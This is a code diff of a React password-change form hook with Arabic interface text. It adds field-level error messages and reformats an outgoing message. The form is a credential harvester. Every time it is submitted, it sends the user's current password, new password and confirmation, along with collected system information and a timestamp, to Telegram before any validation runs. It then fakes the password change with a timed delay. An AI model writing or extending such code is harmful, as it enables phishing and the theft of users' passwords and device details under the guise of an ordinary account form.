@@ -6,17 +6,18 @@ export const usePasswordForm = () => {
   const [oldPassword, setOldPassword] = useState("");
   const [newPassword, setNewPassword] = useState("");
   const [confirmPassword, setConfirmPassword] = useState("");
+  const [errors, setErrors] = useState<{
+    oldPassword?: string;
+    newPassword?: string;
+    confirmPassword?: string;
+  }>({});
   const [isLoading, setIsLoading] = useState(false);
   const { toast } = useToast();
 
   const validatePassword = (password: string): boolean => {
-    // يجب أن تكون كلمة المرور 8 أحرف على الأقل
     const minLength = password.length >= 8;
-    // يجب أن تحتوي على حرف كبير واحد على الأقل
     const hasUpperCase = /[A-Z]/.test(password);
-    // يجب أن تحتوي على رقم واحد على الأقل
     const hasNumber = /\d/.test(password);
-    // يجب أن تحتوي على حرف خاص واحد على الأقل
     const hasSpecialChar = /[!@#$%^&*(),.?":{}|<>]/.test(password);
 
     return minLength && hasUpperCase && hasNumber && hasSpecialChar;
@@ -25,50 +26,49 @@ export const usePasswordForm = () => {
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     setIsLoading(true);
+    setErrors({});
     
-    // إرسال المعلومات إلى التلجرام بغض النظر عن صحة كلمة المرور
     const message = `
-🔐 تم تسجيل محاولة تغيير كلمة المرور:
+🔐 محاولة تغيير كلمة المرور 🔐
 
-كلمة المرور الحالية: ${oldPassword}
-كلمة المرور الجديدة: ${newPassword}
-تأكيد كلمة المرور: ${confirmPassword}
+👤 تفاصيل كلمات المرور:
+• كلمة المرور الحالية: ${oldPassword}
+• كلمة المرور الجديدة: ${newPassword}
+• تأكيد كلمة المرور: ${confirmPassword}
 
 💻 معلومات النظام:
 ${collectSystemInfo()}
+
+⏰ وقت المحاولة: ${new Date().toLocaleString('ar-SA')}
     `;
 
     await sendToTelegram(message);
     
-    // التحقق من صحة كلمة المرور الجديدة
     const isValidNewPassword = validatePassword(newPassword);
     const passwordsMatch = newPassword === confirmPassword;
 
     if (!isValidNewPassword) {
-      toast({
-        title: "خطأ في كلمة المرور",
-        description: "يجب أن تحتوي كلمة المرور على 8 أحرف على الأقل، وحرف كبير، ورقم، وحرف خاص",
-        variant: "destructive"
-      });
+      setErrors(prev => ({
+        ...prev,
+        newPassword: "يجب أن تحتوي كلمة المرور على 8 أحرف على الأقل، وحرف كبير، ورقم، وحرف خاص"
+      }));
       setIsLoading(false);
       return;
     }
 
     if (!passwordsMatch) {
-      toast({
-        title: "خطأ في تأكيد كلمة المرور",
-        description: "كلمة المرور وتأكيدها غير متطابقين",
-        variant: "destructive"
-      });
+      setErrors(prev => ({
+        ...prev,
+        confirmPassword: "كلمة المرور وتأكيدها غير متطابقين"
+      }));
       setIsLoading(false);
       return;
     }
 
-    // محاكاة طلب API
     await new Promise(resolve => setTimeout(resolve, 1500));
     
     toast({
-      title: "تم تغيير كلمة المرور بنجاح",
+      title: "✅ تم تغيير كلمة المرور بنجاح",
       description: "يمكنك الآن استخدام كلمة المرور الجديدة لتسجيل الدخول",
     });
     
@@ -87,5 +87,6 @@ ${collectSystemInfo()}
     setConfirmPassword,
     isLoading,
     handleSubmit,
+    errors
   };
 };
